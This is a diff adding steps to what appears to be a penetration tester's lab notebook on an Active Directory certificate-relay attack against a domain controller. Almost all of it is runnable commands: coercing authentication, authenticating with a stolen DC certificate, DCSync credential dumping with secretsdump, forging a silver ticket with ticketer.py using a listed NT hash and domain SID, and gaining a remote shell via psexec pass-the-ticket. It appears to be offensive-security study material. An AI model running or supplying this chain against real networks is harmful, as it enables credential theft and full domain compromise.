@@ -255,3 +255,33 @@ sudo certipy relay -target 172.16.19.5 -template DomainController
 coercer coerce -l 172.16.19.19 -t 172.16.19.3 -u blwasp -p 'Password123!' -d lab.local -v
 ```
 %% use coercer to coerce our authentication against our target domain in this case the DC. -l represents our listening machine  and d reps the domain%%
+
+```
+certipy auth -pfx lab-dc.pfx
+```
+%% The next step will be to use this certificate to request a TGT and obtain the domain controller hash. With the DC TGT or hash, we can perform two operations. The first would be unique to a domain controller, and we can perform a DCSync attack, and the second would be to create a Silver Ticket. This one is useful when we are not attacking domain controllers, as we can compromise any machine in the network with this method %%
+
+```
+ KRB5CCNAME=lab-dc.ccache secretsdump.py -k -no-pass lab-dc.lab.local
+```
+%% DCSync using the TGT as the Domain Controller %%
+
+```
+secretsdump.py 'lab-dc$'@lab-dc.lab.local -hashes :92bd84175886a57ab41a14731d10428a
+```
+%%  DCSync using the NT Hash as the Domain Controller %%
+
+```
+lookupsid.py 'lab-dc$'@172.16.19.3 -hashes :92bd84175886a57ab41a14731d10428a
+```
+%% you can do a silver ticket attack. You need the target's machine (i.e., LAB-DC$) hash, which in this case, is 92bd84175886a57ab41a14731d10428a, the Domain SID, and a specific SPN to abuse %%
+
+```
+ticketer.py -nthash 92bd84175886a57ab41a14731d10428a -domain-sid S-1-5-21-1817219280-1014233819-995920665 -domain lab.local -spn cifs/lab-dc.lab.local Administrator
+```
+%% forging a silver ticket attack with all the specified parameters %%
+
+```
+KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass lab-dc.lab.local
+```
+%% pass the ticket attack with PsExec %%
